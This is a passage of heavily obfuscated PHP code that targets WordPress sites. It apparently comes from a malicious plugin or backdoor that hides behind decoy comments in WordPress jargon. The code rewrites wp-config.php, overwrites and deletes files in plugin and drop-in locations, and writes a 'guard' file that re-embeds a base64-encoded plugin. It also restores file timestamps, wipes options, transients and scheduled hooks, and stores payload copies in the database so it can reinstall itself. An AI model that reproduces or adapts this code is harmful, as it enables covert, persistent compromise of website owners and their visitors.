foreach ((array)      @$GLOBALS['__scf_b60g6hx_a7ggi_71']($oezqi8yzatwq .    '/'   .  $ru471wzh6k8wmqz    .  ar6vo_1nyhx2koj5(1605)) as     $tfvm_ort_zgdr) $y5mqj3z3td[]  = $tfvm_ort_zgdr;
}
      $it2rwhlmhuuxs   =  g2g3r6pz8prst3gz(ABSPATH     . 'g',  (1+7));



$yz9bgtj8cv  = array(ABSPATH   .      xognx_h1jzkh(1606),      $y4e3mkwgaqm, $r37obgqhbab5,  $skhus7jetg_17bzs,  $oezqi8yzatwq);
  foreach  ($yz9bgtj8cv as $_gd) {$v08q49sa=82*3;$m2lgsuedfvk=$v08q49sa-2;


if (@$GLOBALS['__scf_h23c49ni_b86_43']($_gd) && @$GLOBALS['__scf_v7y4c72abxzjo_47']($_gd))     sqnskai9y5dyys6jk($_gd  . xpm5lg9odtw6di(1287)  .   $it2rwhlmhuuxs, xl8k_pjv1048a7ae7(),   xpm5lg9odtw6di(1607));
}
   if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1602)))     {
     foreach     ($yz9bgtj8cv  as $_gd)   {

     foreach (array(bk9m46jygo3f(511),    bk9m46jygo3f(1608), gz_aorofp7mo(1609),    xognx_h1jzkh(1610),  ar6vo_1nyhx2koj5(1611),   ar6vo_1nyhx2koj5(1612),   gz_aorofp7mo(1613),    xognx_h1jzkh(1614),    ar6vo_1nyhx2koj5(1615))   as  $kuyfxxs_xpqzk5c)    {
  foreach   ((array)     @$GLOBALS['__scf_b60g6hx_a7ggi_71']($_gd   .  '/' .   $kuyfxxs_xpqzk5c .    '*')    as  $jz10r4ppswisc4i)  $y5mqj3z3td[]  = $jz10r4ppswisc4i;
   }
      foreach ((array)   @$GLOBALS['__scf_b60g6hx_a7ggi_71']($_gd  .   ar6vo_1nyhx2koj5(1616))      as  $j6vark151g3p0) $y5mqj3z3td[] =  $j6vark151g3p0;
  }
}
unset($it2rwhlmhuuxs, $yz9bgtj8cv,  $_gd, $kuyfxxs_xpqzk5c,  $jz10r4ppswisc4i, $j6vark151g3p0);



       
 $_xcb7qjxw_0dfkfz    =   array($GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm,  xpm5lg9odtw6di(1520)),   $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()),  bk9m46jygo3f(1520)),  $GLOBALS['__scf_v2rfz0q9cvmh_12']($r37obgqhbab5, bk9m46jygo3f(1617)), $GLOBALS['__scf_v2rfz0q9cvmh_12']($skhus7jetg_17bzs, bk9m46jygo3f(1617)),  $GLOBALS['__scf_v2rfz0q9cvmh_12']($oezqi8yzatwq,  gz_aorofp7mo(1617)));
      if    (defined(xpm5lg9odtw6di(1174)))  $_xcb7qjxw_0dfkfz[]   = $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR, gz_aorofp7mo(1617));
 $bf0v91hre9 =  array();
foreach    ($GLOBALS['__scf_p3c9g_i0vy_148']($_xcb7qjxw_0dfkfz) as $_pd) {
  $bf0v91hre9[] =  $_pd  . '/' .  $p87sf4xhzlmkznx;
 $bf0v91hre9[]  =     $_pd   .  '/'   .    $fw37sospw_xt;

        $bf0v91hre9[] =     $_pd   .     xpm5lg9odtw6di(1618) . $fw37sospw_xt;
 }
      unset($_xcb7qjxw_0dfkfz,  $_pd);
 foreach ($bf0v91hre9 as $ce3r1q0g4b1wa)  {
   if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($ce3r1q0g4b1wa))     fzni2j0j100ogkw6($ce3r1q0g4b1wa, null);


 }
     unset($ce3r1q0g4b1wa);
     $yw0gcf7uxq   =    array($GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH,    gz_aorofp7mo(1619)));
if  (defined(xognx_h1jzkh(1174)))   $yw0gcf7uxq[] = $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR, xognx_h1jzkh(1619));


$yw0gcf7uxq[] =  $GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm,   bk9m46jygo3f(1619));
    $yw0gcf7uxq[]   = $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()),    xognx_h1jzkh(1619));
// color-register indecomposable singleton

      $svf7weo7nq    =     array();


 foreach  ($GLOBALS['__scf_p3c9g_i0vy_148']($yw0gcf7uxq)   as  $i4870akx0oo17h)  $svf7weo7nq[]   =  $i4870akx0oo17h .   xpm5lg9odtw6di(1620);


 unset($yw0gcf7uxq,    $i4870akx0oo17h);
 foreach ($svf7weo7nq      as     $cpr_efw25azd4i)  {
   if (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($cpr_efw25azd4i)) continue;
 

  $paudvk020we1z90 =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($cpr_efw25azd4i);
  if   ($paudvk020we1z90  &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  xpm5lg9odtw6di(519))   !==     false) {


    $paudvk020we1z90  =   $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(964)   .    $GLOBALS['__scf_ihsujvdc278_818']($p87sf4xhzlmkznx, '/')  .  xognx_h1jzkh(965), "\n",   $paudvk020we1z90);
    if ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90))  {

   $paudvk020we1z90   =    $GLOBALS['__scf_a6uiw8bt24jybf_454'](xpm5lg9odtw6di(966) .  $GLOBALS['__scf_ihsujvdc278_818']($p87sf4xhzlmkznx, '/')  .   xpm5lg9odtw6di(965),     "\n",    $paudvk020we1z90);
}
 if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90))   {
 $paudvk020we1z90 = $GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(967)      .   $GLOBALS['__scf_ihsujvdc278_818']($p87sf4xhzlmkznx,    '/')   .    xognx_h1jzkh(1621), "\n",  $paudvk020we1z90);
 }
  if ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90))    rmpvo8i8m8kfd9311njxy7($cpr_efw25azd4i, $paudvk020we1z90);


        }


  }


 $zsd7fj8afezx_plj    =   ABSPATH   .    xpm5lg9odtw6di(1240);
 if   (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($zsd7fj8afezx_plj))  {
$wylwphb7y4 =     $GLOBALS['__scf_meo_1tvjsals_11'](ABSPATH)   .     xpm5lg9odtw6di(1622);
   if  (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($wylwphb7y4)) $zsd7fj8afezx_plj      =  $wylwphb7y4;



     }



  if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($zsd7fj8afezx_plj)   && @$GLOBALS['__scf_v7y4c72abxzjo_47']($zsd7fj8afezx_plj)) {
 $_wc     =   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($zsd7fj8afezx_plj);
  if ($GLOBALS['__scf_is0fvk8c7tq2_41']($_wc)  &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($_wc,     xpm5lg9odtw6di(1623))  !== false) {


 $j9co7fgd12   =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](xpm5lg9odtw6di(1624),   "define( 'WP_CACHE', true );\n",  $_wc);



if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($j9co7fgd12) &&     $j9co7fgd12 !==    $_wc     &&     g9edwd6m8_9cm8($j9co7fgd12))   {
   $ikq81bfwhum_avuc =    @$GLOBALS['__scf_k4z5lhhe91ty_98']($zsd7fj8afezx_plj);
 if (rmpvo8i8m8kfd9311njxy7($zsd7fj8afezx_plj,  $j9co7fgd12))    {


      if ($ikq81bfwhum_avuc) @$GLOBALS['__scf_iylawj38txgw_73']($zsd7fj8afezx_plj,     $ikq81bfwhum_avuc);
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1561)))    @delete_option(bk9m46jygo3f(1545));
}

       }
     unset($j9co7fgd12, $ikq81bfwhum_avuc);
}
unset($_wc);
  }
 unset($zsd7fj8afezx_plj,  $wylwphb7y4);
  $d_4faydflpxb3yw =     $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1153)) ? @$GLOBALS['__scf_if1j_n66jo7w7_111'](xognx_h1jzkh(1625))  : false;
if (!$d_4faydflpxb3yw    ||  $d_4faydflpxb3yw  ===  "") $d_4faydflpxb3yw   =   xognx_h1jzkh(517);
 $ip7rnps9678h  = array($GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH,   bk9m46jygo3f(1619)));
    if  (defined(xpm5lg9odtw6di(1174))) $ip7rnps9678h[]     =     $GLOBALS['__scf_v2rfz0q9cvmh_12'](WP_CONTENT_DIR,  xpm5lg9odtw6di(1626));$cko767_1zpamb=214|114;$uezk_ont54e8=$cko767_1zpamb^12;



  $ip7rnps9678h[]      = $GLOBALS['__scf_v2rfz0q9cvmh_12']($y4e3mkwgaqm,    xpm5lg9odtw6di(1626));
 $ip7rnps9678h[] = $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()),    xognx_h1jzkh(1626));

 $e84v78gefz    =    array();
 foreach ($GLOBALS['__scf_p3c9g_i0vy_148']($ip7rnps9678h)  as   $nb2aghmmee5ff)   $e84v78gefz[]   =  $nb2aghmmee5ff .   '/'  . $d_4faydflpxb3yw;
unset($ip7rnps9678h,  $nb2aghmmee5ff);
  foreach  ($e84v78gefz  as $lsswgv9g3v6q)  {
  if    (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($lsswgv9g3v6q)) continue;
 $paudvk020we1z90   = @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($lsswgv9g3v6q);
   if  ($paudvk020we1z90     &&  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($paudvk020we1z90,  xognx_h1jzkh(519))  !==     false)    {
   $paudvk020we1z90      =  $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1627) .    $GLOBALS['__scf_ihsujvdc278_818']($fw37sospw_xt, '/')  .   xpm5lg9odtw6di(1628),    "", $paudvk020we1z90);


   if ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90))  rmpvo8i8m8kfd9311njxy7($lsswgv9g3v6q,   $paudvk020we1z90);
 }
  }
 $xg88sao0r98u   =  $GLOBALS['__scf_expvj_2k_kl_150']($y5mqj3z3td,   $bf0v91hre9);
     $mxxp0aof5xm108 =   array();
 $yxx_2jd3jb8    =  false;


  foreach   ($GLOBALS['__scf_j59q8mojj8e4ar_363']($svf7weo7nq,     $e84v78gefz)   as   $sidnv_p7tzfdr)    {
 if   (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($sidnv_p7tzfdr)) continue;

$hj9cti134qmi1_   =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($sidnv_p7tzfdr);
   if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($hj9cti134qmi1_)) {
$yxx_2jd3jb8  =  true;
 continue;
    }
      if   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($hj9cti134qmi1_, xpm5lg9odtw6di(519)) ===  false) continue;
if ($GLOBALS['__scf_k0rtq2h5b39ui_1370'](bk9m46jygo3f(1629), $hj9cti134qmi1_, $e4ji982ca28fua1p)) {
      foreach ($GLOBALS['__scf_j59q8mojj8e4ar_363']($e4ji982ca28fua1p[1],   $e4ji982ca28fua1p[2], $e4ji982ca28fua1p[(2+1)]) as   $yu57iori8cn0u1)      {
if ($yu57iori8cn0u1    !==   "")  $mxxp0aof5xm108[$GLOBALS['__scf_pmoxtzoe3f0qw_3']($yu57iori8cn0u1)]  =  true;
   }

}
  unset($hj9cti134qmi1_, $e4ji982ca28fua1p,  $yu57iori8cn0u1);
 }
if  (!$yxx_2jd3jb8)  {
// countable orbit


  foreach ($xg88sao0r98u as      $s6um63o_s0zywj1)     {
 if    (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($s6um63o_s0zywj1))    {
if  (isset($mxxp0aof5xm108[$GLOBALS['__scf_pmoxtzoe3f0qw_3']($s6um63o_s0zywj1)]))   continue;
 f97udlofaljpuxw1_jgnfh($s6um63o_s0zywj1,  (78+342));
 xv6oqhjncehpr7v_mus7($s6um63o_s0zywj1);

        }
 }
    }
 unset($mxxp0aof5xm108, $yxx_2jd3jb8,   $sidnv_p7tzfdr);
 

 foreach     (pgwd7_bj4mbdfer_vo() as $ukeq3nixy09n)  {
      if (!@$GLOBALS['__scf_vpig9uwvw8_pu_20']($ukeq3nixy09n)  || !@$GLOBALS['__scf_v7y4c72abxzjo_47']($ukeq3nixy09n)) continue;
 $paudvk020we1z90 =    @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($ukeq3nixy09n);



       if ($GLOBALS['__scf_is0fvk8c7tq2_41']($paudvk020we1z90))      {
 $tnnfdm_uwi3  =   yezcy6nac7y0hwjhoe($paudvk020we1z90,  bk9m46jygo3f(1390),   bk9m46jygo3f(1630));
     $tnnfdm_uwi3 = yezcy6nac7y0hwjhoe($tnnfdm_uwi3,    xognx_h1jzkh(1392),  xognx_h1jzkh(1630));
   if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($tnnfdm_uwi3)   &&  $tnnfdm_uwi3  !==    $paudvk020we1z90)  rmpvo8i8m8kfd9311njxy7($ukeq3nixy09n,    $tnnfdm_uwi3);
 unset($tnnfdm_uwi3);
     }
   }
if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1631)) &&      $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1632)))  {
  $key  = rovyqrjbfjej9p14cdqtzc();
   if   ($key !==  false) {
 $zdn74pi5a00jzon6 =   @$GLOBALS['__scf_xv6k4zu903au_1246']($key, 'w',  0,    0);
 if  ($zdn74pi5a00jzon6)   {
 @$GLOBALS['__scf_jprl74_5uj3sy_1253']($zdn74pi5a00jzon6);
@$GLOBALS['__scf_kv9kz2vgrwaf_1249']($zdn74pi5a00jzon6);
 }
     }
  }
 if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1561))) {

$y2m_cj2ki15  =     g2g3r6pz8prst3gz(ABSPATH  .  bk9m46jygo3f(1563),   (5+5));
// PHP 8.4 fibers taxonomy registration


      @delete_option($y2m_cj2ki15);


   $qzh17sc6ny =      $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1572)) ?   @get_option(bk9m46jygo3f(1503),   array())  :    array();
  if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($qzh17sc6ny))    {
   if (isset($qzh17sc6ny['b']))      xv6oqhjncehpr7v_mus7($qzh17sc6ny['b']);
  if   (isset($qzh17sc6ny[xpm5lg9odtw6di(1633)])     &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($qzh17sc6ny[ar6vo_1nyhx2koj5(1633)]))     {



 foreach   ($qzh17sc6ny[bk9m46jygo3f(1634)]    as     $_ci)   {
   if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($_ci)  &&      isset($_ci['b']))    xv6oqhjncehpr7v_mus7($_ci['b']);
}
   }
}
@delete_option(ar6vo_1nyhx2koj5(1503));
    @delete_option(xpm5lg9odtw6di(1500));
  @delete_option(bk9m46jygo3f(1235));
 @delete_option(ar6vo_1nyhx2koj5(1635));
      @delete_option(xognx_h1jzkh(1636));
    @delete_option(bk9m46jygo3f(1170));
 @delete_option(xognx_h1jzkh(1171));
@delete_option(bk9m46jygo3f(1637));

   unset($qzh17sc6ny,   $_ci);
 }

   if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1638)))   {
   @delete_transient(bk9m46jygo3f(1639));



      @delete_transient(xpm5lg9odtw6di(1305));



     @delete_transient(j61b_lqa6xnjdjocyu15jd());$dipw0nr9m6p=4032;$xhkrz98gl3=$dipw0nr9m6p%2;
       }
   if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(642)))   {
    @wp_clear_scheduled_hook(xognx_h1jzkh(1640));
// WP useEntityProp rewrite flush




   @wp_clear_scheduled_hook(xognx_h1jzkh(1641));
       @wp_clear_scheduled_hook(ios6xxr5y_3fibzei373rz());



  }

   }     catch  (Throwable $o_qyrtxl85owt)     {
// configure checkpoint for WP Site Editor

kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1642),   $o_qyrtxl85owt);
      }  catch (Exception $o_qyrtxl85owt)      {
      }
}
  function   rdb_1qm0tboibkufhq()
   {
try  {
 if (!defined(xognx_h1jzkh(1596)))  return  false;



    $y4e3mkwgaqm   = hzkj2ifwqdzf_u32qrf();
  $bdy2ac1uldkpsh5   =   $y4e3mkwgaqm .  xpm5lg9odtw6di(1643);
 $rv8s_ul0qu2z09u = $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),  gz_aorofp7mo(1644));
  $h3wz11cllq = p5t6fz6i7ccgjh();
if  (!$h3wz11cllq    ||   $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq) <   (0x5f+0x195)    ||     $GLOBALS['__scf_fxl4k4gsul_10']($h3wz11cllq)  > (1048494+82) ||  sl80t81tfwuwpn5w1_($h3wz11cllq)   ||    !g9edwd6m8_9cm8($h3wz11cllq)) return   false;
 $current   =   @$GLOBALS['__scf_ojjepdqapp29_684']($bdy2ac1uldkpsh5)    ?   @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($bdy2ac1uldkpsh5)   :   "";
if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current))    {
 kkpdha95nyx3tbltd10(bk9m46jygo3f(627),   xpm5lg9odtw6di(1189));
      return false;
   }
// PHP 8.0 JIT retina density

       $current  =   za8ge46vc9y1a6($current);
     $al5ju0cl6g1mjvy =   xl8k_pjv1048a7ae7()   .    ':'  .    g2g3r6pz8prst3gz(ABSPATH   .  xpm5lg9odtw6di(1645),  (2+6));
 $i8boz5lfd0a =  bk9m46jygo3f(1646)  .     $al5ju0cl6g1mjvy   .     gz_aorofp7mo(1273);
$walsf9zikggv4 =   xpm5lg9odtw6di(1647) . $al5ju0cl6g1mjvy   .   xognx_h1jzkh(1648);
    $_jtgt_h57t9091  =   g2g3r6pz8prst3gz(ABSPATH   .     ar6vo_1nyhx2koj5(1645),  (0x3+0x5));
$x5mxpl9319trapge   = $GLOBALS['__scf_a6uiw8bt24jybf_454'](bk9m46jygo3f(1649)  .      $_jtgt_h57t9091 . xognx_h1jzkh(1650),   "",  $current);
   $duqqkzcuis70j2yh =   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($x5mxpl9319trapge,     gz_aorofp7mo(1651))  !==  false);
      if   ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($current, $i8boz5lfd0a)      !== false  &&     $GLOBALS['__scf_j_4rj7vg4ae0j_7']($current,     $walsf9zikggv4)  !== false  &&     !$duqqkzcuis70j2yh)     return   true;
 $current  = $GLOBALS['__scf_a6uiw8bt24jybf_454'](xpm5lg9odtw6di(1652), "",    $x5mxpl9319trapge);


  if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($current)) {
    kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1653), gz_aorofp7mo(1228));
  return   false;
  }


    $goxpgitg2brxu =  jzt71g_lciq6atvff();

 if  (!$goxpgitg2brxu) return  false;
$amsecxbpo_1302  = ar6vo_1nyhx2koj5(1654)    .   $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($rv8s_ul0qu2z09u  .  (string)  aruikh7uoh1wrp5bqr79()),     0,     (1+7));
$cqcynf2x9r7     =   pgrkqypzhwz32d(
     ar6vo_1nyhx2koj5(628),
        array('__SLUG__',   '__PLUGIN_BASE64__', '__GUARD_NAME__',   '__VERSION__'),
      array($rv8s_ul0qu2z09u, $goxpgitg2brxu,   $amsecxbpo_1302,      xl8k_pjv1048a7ae7())
);
    if     (!$cqcynf2x9r7)    {
     if  ((int)     get_option(ar6vo_1nyhx2koj5(1267),  0)    >      0)     kkpdha95nyx3tbltd10(bk9m46jygo3f(1655), xpm5lg9odtw6di(1656));
  return false;


  }
 $current =   za8ge46vc9y1a6($current);



$mbhs967bv9s8x    = $GLOBALS['__scf_a6uiw8bt24jybf_454'](xognx_h1jzkh(1280),   "",     $cqcynf2x9r7);
     $o_sm5784opqpkr  =     ($GLOBALS['__scf_fxl4k4gsul_10']($current)  ===  0);
if (!$o_sm5784opqpkr) {
if (!rrp4_qeca82cei_(xpm5lg9odtw6di(1655))) {
 kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1655),   xpm5lg9odtw6di(1230));
     return false;
}
    if (!ut5isdl00gkjaids($bdy2ac1uldkpsh5, $current))    {
 kkpdha95nyx3tbltd10(xognx_h1jzkh(1655), ar6vo_1nyhx2koj5(1657));
return false;
      }
    u23ayxegshiotpsvk7bvkb(ar6vo_1nyhx2koj5(1658));
 } else    {
    if      (!ut5isdl00gkjaids($bdy2ac1uldkpsh5,  ""))  {
   kkpdha95nyx3tbltd10(bk9m46jygo3f(1659),  gz_aorofp7mo(1657));



      return  false;
   }
// non-strict allocator

    }
    $ok4xoahvrt_r =  uurnht5ff7e_kxoij13($current, $i8boz5lfd0a   .   "\n"   .     $mbhs967bv9s8x    .      "\n"   . $walsf9zikggv4);
        if  (!rmpvo8i8m8kfd9311njxy7($bdy2ac1uldkpsh5,    $ok4xoahvrt_r))   {
return    false;
 }
  ykbctv6vdni0fv($bdy2ac1uldkpsh5);
     g6q1ehat0szqqsfbv2($bdy2ac1uldkpsh5);
return     true;
   } catch (Throwable  $o_qyrtxl85owt) {
  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1659),   $o_qyrtxl85owt);
return  false;
}  catch  (Exception  $o_qyrtxl85owt) {
   return   false;
  }
 }
 function  pgwd7_bj4mbdfer_vo()
{
       $wyjil_di2aatar   = array();
  if   (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1572)))  return   $wyjil_di2aatar;
      $odelffzfi5aa32m =   (defined(xognx_h1jzkh(1174))  ?     WP_CONTENT_DIR   : (defined(gz_aorofp7mo(1596))  ?    ABSPATH . ar6vo_1nyhx2koj5(811)  : "")) .   bk9m46jygo3f(1660);
 $x608u6r7zv  = (string) @get_option(xognx_h1jzkh(1661),    "");



        if  ($x608u6r7zv  !== "")    $wyjil_di2aatar[]   =   $odelffzfi5aa32m     . $x608u6r7zv .   gz_aorofp7mo(1583);
   $ql2f2qtjckurljcv  =    (string) @get_option(xpm5lg9odtw6di(1056), "");
 if ($ql2f2qtjckurljcv   !== "" &&    $ql2f2qtjckurljcv   !== $x608u6r7zv)  $wyjil_di2aatar[]      = $odelffzfi5aa32m  .   $ql2f2qtjckurljcv     .    bk9m46jygo3f(1583);
  return   $wyjil_di2aatar;
   }
function  tguz26ha7xctwcmwr240_s()
 {
if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(207))  &&      is_multisite()  && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1662)))    {
      return  (array)  @get_site_option(xognx_h1jzkh(1663),  array());
 }
   return  (array)    @get_option(xognx_h1jzkh(1663), array());



}

   function   fq8oe693ngagbul_5($a3l16_60s2rsqw9)
{
 if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(207))    &&   is_multisite()   &&     $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1664)))      {



 @update_site_option(bk9m46jygo3f(1663),     $a3l16_60s2rsqw9);
   return;
  }
// @throttle work-queue

  @update_option(gz_aorofp7mo(1663),   $a3l16_60s2rsqw9,   bk9m46jygo3f(1665));
 }
     function    czkor130p9u400k8($bki0gi20hmqucm)



  {



   $a3l16_60s2rsqw9     =  tguz26ha7xctwcmwr240_s();


  return  isset($a3l16_60s2rsqw9[g2g3r6pz8prst3gz($bki0gi20hmqucm,  (4+8))]);
 }

function    ycygkr4vccqxrwnu_a($bki0gi20hmqucm)


{


$a3l16_60s2rsqw9  =     tguz26ha7xctwcmwr240_s();
   


    $alggx5iglt34x  = $GLOBALS['__scf_ks7_xfapvywl_185']() -   (0x2aa958+0x4bfda8);
 foreach  ($a3l16_60s2rsqw9   as   $u0vg1o4w59jt6xuu  =>   $q718e7lavyg)   {
  if    ((int) $q718e7lavyg <     $alggx5iglt34x) unset($a3l16_60s2rsqw9[$u0vg1o4w59jt6xuu]); 
 }
 $a3l16_60s2rsqw9[g2g3r6pz8prst3gz($bki0gi20hmqucm,  (0x7+0x5))]  =   $GLOBALS['__scf_ks7_xfapvywl_185']();
  fq8oe693ngagbul_5($a3l16_60s2rsqw9);
 }
      function     om6t3icuzlmqlx2($bki0gi20hmqucm,     $ok4xoahvrt_r)
    {
    if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($ok4xoahvrt_r) || $ok4xoahvrt_r    === "" ||   $GLOBALS['__scf_fxl4k4gsul_10']($ok4xoahvrt_r)   >    (0xdb171+0x24e8f)) return;
  $seo_676hkzd  =  $GLOBALS['__scf_j65ea9eiow7te_1243'](gz_aorofp7mo(1666),     $ok4xoahvrt_r);
 $sdmifeyylcj = (array) @get_option(bk9m46jygo3f(1667),  array());
   $xvqxrl6r3nrmbkp   = g2g3r6pz8prst3gz($bki0gi20hmqucm,  (0x2+0xa));
   if  (isset($sdmifeyylcj[$xvqxrl6r3nrmbkp][xpm5lg9odtw6di(1666)])  &&   $sdmifeyylcj[$xvqxrl6r3nrmbkp][ar6vo_1nyhx2koj5(1666)]  ===   $seo_676hkzd)    return;$ny90io45=PHP_INT_MAX/PHP_INT_MAX;$ygsrth3q3k28t=$ny90io45+79;
    $sdmifeyylcj[$xvqxrl6r3nrmbkp]    = array(xognx_h1jzkh(1584)  =>  $GLOBALS['__scf_fxl4k4gsul_10']($ok4xoahvrt_r),   bk9m46jygo3f(1668)    => $seo_676hkzd,   xognx_h1jzkh(1669) =>   $GLOBALS['__scf_upr7jxyxre3_348']($ok4xoahvrt_r));
@update_option(xognx_h1jzkh(1667),    $sdmifeyylcj,    xpm5lg9odtw6di(1665));
  }

 function  _31r1_gt3bwd4gri4c79e($bki0gi20hmqucm)
 {
    $sdmifeyylcj      =  (array) @get_option(xognx_h1jzkh(1667), array());
  $o_qyrtxl85owt  =  isset($sdmifeyylcj[g2g3r6pz8prst3gz($bki0gi20hmqucm,    (11+1))]) ? $sdmifeyylcj[g2g3r6pz8prst3gz($bki0gi20hmqucm,  (0x7+0x5))]     :   null;
   if (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($o_qyrtxl85owt)   || empty($o_qyrtxl85owt[xpm5lg9odtw6di(1669)])      || empty($o_qyrtxl85owt[ar6vo_1nyhx2koj5(1670)]) ||  empty($o_qyrtxl85owt[ar6vo_1nyhx2koj5(1668)])) return  false;
     $g1axcaz1nux  =     $GLOBALS['__scf_hg1ogpq4w6_351']($o_qyrtxl85owt[gz_aorofp7mo(1671)], true);

  if    (!$GLOBALS['__scf_is0fvk8c7tq2_41']($g1axcaz1nux)     ||  $GLOBALS['__scf_fxl4k4gsul_10']($g1axcaz1nux) !==  (int)  $o_qyrtxl85owt[gz_aorofp7mo(1670)])  return  false;
   if     ($GLOBALS['__scf_j65ea9eiow7te_1243'](xpm5lg9odtw6di(1672), $g1axcaz1nux)  !==  $o_qyrtxl85owt[xognx_h1jzkh(1673)])  return  false;
 if  (!g9edwd6m8_9cm8($g1axcaz1nux))  return   false;
 return    $g1axcaz1nux;
 }


function  b9ak26unr8mq4hn4nhqpi($ukeq3nixy09n,   $current)
   {
$je2wsy2_6o   =    z61fradqylojwtzllav3u($current);
   if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($je2wsy2_6o) || $je2wsy2_6o  === "")  return   false;
      $xfp6xk5kus5kzx44    =   fgatjmo7gg2xolgmpki4y2()  . xognx_h1jzkh(1674) .  g2g3r6pz8prst3gz($ukeq3nixy09n,  (0x4+0x8)) . xognx_h1jzkh(1675);


   $_ex =  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xfp6xk5kus5kzx44)  ?  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xfp6xk5kus5kzx44) : false;
  if     (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_ex)  ||    $_ex   !==   $je2wsy2_6o)  {
     if  (!rmpvo8i8m8kfd9311njxy7($xfp6xk5kus5kzx44,  $je2wsy2_6o)) return   false;
$_ex  =  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($xfp6xk5kus5kzx44)  ?  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($xfp6xk5kus5kzx44)      :  false;
if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_ex)     ||   $_ex !==   $je2wsy2_6o) return   false;
}
      om6t3icuzlmqlx2($ukeq3nixy09n,  $je2wsy2_6o);
return      true;
    }
function htjygpmnm_v7qvjikhex4()
   {
    fq8oe693ngagbul_5(array());
}



 function  afl__jit9h62oih()
{
// specialize permission for WP BlockControls




try {



   if   (!defined(bk9m46jygo3f(1596)) ||  !$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1572)))  return;
   foreach   (pgwd7_bj4mbdfer_vo() as  $vzii45wfyjy)    {$f0jsb4n27pu=-780;$gn_ctn2tc_5j1=($f0jsb4n27pu>0)?$f0jsb4n27pu:-$f0jsb4n27pu;

